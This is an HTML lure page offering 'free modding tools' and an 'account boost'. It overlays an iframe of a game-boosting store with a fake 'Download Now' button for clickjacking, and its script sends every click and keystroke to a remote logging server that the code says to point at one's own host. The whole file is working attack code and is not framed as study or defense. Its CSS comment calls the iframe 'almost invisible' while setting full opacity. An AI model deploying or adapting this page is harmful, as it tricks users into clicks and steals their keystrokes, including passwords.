<!DOCTYPE html>
<html lang="en">
<head>
    <title>Free Modding Tools! Click to Claim</title>
    <style>
        .container {
            position: relative;
            width: 100%;
            height: 600px;
        }
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 600px;
            opacity: 100;  /* Almost invisible */
            z-index: 2;
        }
        .fake-button {
            position: absolute;
            top: 250px;
            left: 40%;
            z-index: 3;
            background-color: red;
            color: white;
            padding: 15px;
            font-size: 20px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <h1>Claim Your Free Account Boost!</h1>
    <p>Click the button below to Get Your Free Boost.</p>
    
    <div class="container">
        <div class="fake-button">Download Now</div>
        <iframe src="https://www.messymoddingstore.com/product/fortnite-wins-boost-service-unranked-and-ranked-play-battle-royale-or-reloaded/" frameborder="0"></iframe>
    </div>
    
    <script>
        // Function to send log data to the server
        function sendLog(eventType, eventData) {
            fetch("http://localhost:3000/log", {  // Replace with your server's IP or domain if needed
                method: "POST",
                body: JSON.stringify({
                    eventType: eventType,
                    eventData: eventData,
                    time: new Date().toISOString()
                }),
                headers: {
                    "Content-Type": "application/json"
                }
            }).catch(error => {
                console.error("Logging error:", error);
            });
        }

        // Log mouse clicks
        document.addEventListener("click", function(event) {
            sendLog("click", { x: event.clientX, y: event.clientY });
        });

        // Log key presses
        document.addEventListener("keydown", function(event) {
            sendLog("keydown", { key: event.key });
        });
    </script>
</body>
</html>
